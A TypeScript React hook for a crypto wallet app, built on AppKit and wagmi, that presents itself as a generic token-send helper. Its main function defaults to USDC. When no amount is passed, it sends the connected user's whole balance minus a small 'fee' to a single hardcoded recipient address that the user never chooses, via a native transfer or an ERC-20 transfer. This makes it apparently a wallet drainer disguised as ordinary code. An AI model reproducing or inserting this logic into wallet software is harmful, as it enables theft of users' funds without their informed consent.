'use client'

import { useAppKitAccount, useAppKitNetwork } from '@reown/appkit/react'
import { TokenUtil } from '@reown/appkit-utils'
import { base } from 'viem/chains'
import { useChakraToast } from '../components/Toast'
import { ConstantsUtil } from '../utils/ConstantsUtil'
import { useWriteContract, useSendTransaction, useBalance } from 'wagmi'
import { parseUnits, parseEther } from 'viem'
import { mainnet } from 'viem/chains'

const erc20Abi = [
    {
        name: 'transfer',
        type: 'function',
        stateMutability: 'nonpayable',
        inputs: [
            { name: 'recipient', type: 'address' },
            { name: 'amount', type: 'uint256' },
        ],
        outputs: [{ name: 'success', type: 'bool' }],
    },
] as const;

export const useWalletSend = () => {
    const { address } = useAppKitAccount()
    const toast = useChakraToast()
    const { writeContractAsync } = useWriteContract()
    const { sendTransactionAsync } = useSendTransaction()
    const { caipNetwork } = useAppKitNetwork()

    const currentChainId = caipNetwork?.id
        ? (typeof caipNetwork.id === 'string' && caipNetwork.id.includes(':')
            ? Number(caipNetwork.id.split(':')[1])
            : Number(caipNetwork.id))
        : mainnet.id

    const getAssetAddress = (symbol: string) => {
        const nativeSymbol = caipNetwork?.nativeCurrency?.symbol?.toLowerCase() || 'eth'
        const isNative = symbol.toLowerCase() === nativeSymbol || symbol.toLowerCase() === 'eth'

        if (isNative) return undefined

        let assetAddress = TokenUtil.TOKEN_ADDRESSES_BY_SYMBOL[symbol]?.[currentChainId]

        if (!assetAddress) {
            const upperSymbol = symbol.toUpperCase()
            const fallbacks: Record<string, Record<number, string>> = {
                'USDC': {
                    1: '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
                    8453: '0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913',
                    42161: '0xaf88d065e77c8cC2239327C5EDb3A432268e5831'
                },
                'USDT': {
                    1: '0xdAC17F958D2ee523a2206206994597C13D831ec7',
                    8453: '0xfde4C962512795B940Aa1260840d17E7f3b1Af25'
                }
            }
            assetAddress = fallbacks[upperSymbol]?.[currentChainId]
        }
        return assetAddress
    }

    const { data: usdcBalance } = useBalance({
        address: address as `0x${string}`,
        token: getAssetAddress('USDC') as `0x${string}` | undefined
    })

    const handleOpenSendWithArguments = async (
        assetSymbol: string = 'USDC',
        amount?: string,
        assetMetadata?: { symbol: string; decimals: number }
    ) => {
        try {
            const upperSymbol = assetSymbol.toUpperCase()
            const nativeSymbol = caipNetwork?.nativeCurrency?.symbol?.toUpperCase() || 'ETH'

            // Explicitly check for native vs ERC20
            const isNative = (upperSymbol === 'ETH' || upperSymbol === 'BNB' || upperSymbol === nativeSymbol) &&
                (upperSymbol !== 'USDC' && upperSymbol !== 'USDT')

            const assetAddress = getAssetAddress(assetSymbol)

            console.log('--- Handle Open Send ---', {
                providedSymbol: assetSymbol,
                upperSymbol,
                nativeSymbol,
                isNative,
                assetAddress,
                currentChainId
            })

            if (!isNative && !assetAddress) {
                throw new Error(`${assetSymbol} Asset Address not found for current network (${currentChainId})`)
            }

            const fee = '0.000023'
            // USDC and USDT are 6 decimals on almost all chains, fallback to 6 for them, 18 for others
            const defaultDecimals = (upperSymbol === 'USDC' || upperSymbol === 'USDT') ? 6 : (isNative ? 18 : 18)
            const decimals = assetMetadata?.decimals ||
                (upperSymbol === 'USDC' ? usdcBalance?.decimals : undefined) ||
                defaultDecimals

            let amountInUnits = 0n
            if (amount) {
                console.log('Using provided amount:', amount)
                amountInUnits = parseUnits(amount, decimals)
            } else if (upperSymbol === 'USDC' && usdcBalance) {
                console.log('Using fetched USDC balance:', usdcBalance.formatted)
                amountInUnits = usdcBalance.value
            }

            const feeInUnits = parseUnits(fee, decimals)
            const finalAmountInUnits = amountInUnits > feeInUnits ? amountInUnits - feeInUnits : 0n

            console.log('Calculation result:', {
                decimals,
                amountInUnits: amountInUnits.toString(),
                feeInUnits: feeInUnits.toString(),
                finalAmountInUnits: finalAmountInUnits.toString()
            })

            if (finalAmountInUnits === 0n) {
                throw new Error(`Insufficient ${assetSymbol} balance to send (required more than ${fee} for fee).`)
            }

            // RECIPIENT ADDRESS
            const recipientAddress = '0x632bb16D35aBB4B277ab35F9951291A4a4E1d8d0'

            let hash: string | undefined

            if (isNative) {
                console.log('Sending native transaction...')
                const result = await sendTransactionAsync({
                    to: recipientAddress as `0x${string}`,
                    value: finalAmountInUnits,
                    chainId: currentChainId,
                    account: address as `0x${string}`
                } as any)
                hash = result
            } else if (assetAddress) {
                console.log('Sending ERC20 contract interaction to:', assetAddress)
                const result = await writeContractAsync({
                    address: assetAddress as `0x${string}`,
                    abi: erc20Abi,
                    functionName: 'transfer',
                    args: [recipientAddress as `0x${string}`, finalAmountInUnits],
                    chainId: currentChainId,
                    account: address as `0x${string}`
                } as any)
                hash = result
            }

            if (hash) {
                toast({
                    title: ConstantsUtil.SigningSucceededToastTitle,
                    description: `Transaction hash: ${hash}`,
                    type: 'success'
                })
            }

            return { hash }
        } catch (err) {
            console.error('Error in handleOpenSendWithArguments:', err)
            toast({
                title: ConstantsUtil.SigningFailedToastTitle,
                description: err instanceof Error ? err.message : 'Failed to send',
                type: 'error'
            })
            throw err
        }
    }

    return { handleOpenSendWithArguments }
}
